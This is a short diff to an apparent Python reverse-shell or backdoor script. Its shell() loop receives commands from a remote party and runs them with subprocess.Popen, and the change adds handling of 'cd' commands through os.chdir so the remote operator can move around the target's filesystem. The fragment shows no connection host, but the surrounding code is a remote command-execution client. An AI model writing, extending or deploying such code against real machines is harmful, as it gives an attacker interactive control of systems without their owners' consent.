@@ -2,6 +2,7 @@ import socket
 import time
 import json
 import subprocess
+import os
 
 
 def sender(data):
@@ -36,6 +37,8 @@ def shell():
         command = receiver()
         if command == "quit":
             break
+        elif command[:3] == "cd ":
+            os.chdir(command[3:])
         else:
             execute = subprocess.Popen(
                 command,
